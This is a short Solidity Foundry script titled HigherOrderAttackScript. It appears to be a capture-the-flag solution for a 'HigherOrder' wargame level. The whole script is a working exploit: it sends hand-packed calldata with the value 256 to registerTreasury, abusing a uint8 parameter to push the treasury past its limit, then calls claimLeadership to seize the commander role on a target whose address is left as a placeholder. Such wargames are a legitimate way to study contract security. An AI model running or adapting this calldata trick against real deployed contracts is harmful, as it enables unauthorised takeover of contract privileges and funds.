// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;
import "forge-std/Script.sol";

interface IHigherOrder {
    function commander() external returns (address);
    function treasury() external returns (uint256);
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}

contract HigherOrderAttackScript is Script {
    function setUp() public {}

    function run() public {
        IHigherOrder target = IHigherOrder(0x0000000000000000000000000000000000000000); // Insert target target address

        vm.startBroadcast();

        bytes memory data = abi.encodePacked(uint256(256));
        (bool result, bytes memory _data) =
            address(target).call(abi.encodePacked(IHigherOrder.registerTreasury.selector, data));
        target.claimLeadership();


        vm.stopBroadcast();
    }
}
